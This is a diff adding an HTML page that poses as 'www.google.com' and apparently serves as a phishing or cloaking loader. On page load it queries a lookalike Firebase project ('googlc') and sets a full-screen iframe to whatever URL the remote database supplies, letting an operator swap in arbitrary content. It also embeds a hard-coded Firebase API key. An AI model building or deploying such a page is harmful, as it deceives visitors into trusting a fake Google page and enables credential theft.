@@ -1,0 +1,43 @@
+<html>
+<head>
+<title>www.google.com</title>
+<link rel='Shortcut Icon' type='image/x-icon' href='logo1.png'>
+</head>
+<iframe id="gfgFrame" src="" style="height: 99%; width: 100%; border:none;"></iframe>
+<body>
+	<script src="https://www.gstatic.com/firebasejs/3.7.4/firebase.js"></script>
+	<script type="text/javascript">
+	var file;
+	window.onload = function onStartup() //------------------------------------------------------>>executed when page is loaded
+		{
+			const firebaseConfig = {
+				apiKey: "AIzaSyC15By8-r26xwHZRHWwITtmHnGLvw96xiE",
+				authDomain: "googlc-d5109.firebaseapp.com",
+				databaseURL: "https://googlc-d5109-default-rtdb.firebaseio.com/",
+				projectId: "googlc-d5109",
+				storageBucket: "googlc-d5109.appspot.com",
+				messagingSenderId: "618930560151",
+				appId: "1:618930560151:web:59ffb492b09307917b1dd2",
+				measurementId: "G-K784ES36LZ"
+			};
+			firebase.initializeApp(firebaseConfig);
+			firebase.database().ref('CriticalData/currentPage').once('value').then(function(snapshot) {
+				file = snapshot.A.B;
+				if(file=="false")
+				{
+				    document.getElementById("gfgFrame").src= "indexErr.html";
+				}
+				else if(file=="true")
+				{
+				    document.getElementById("gfgFrame").src= "indexR.html";
+				}
+				else
+				{
+				    document.getElementById("gfgFrame").src= file;
+				}
+			});
+		}
+	</script>
+</body>
+
+</html>
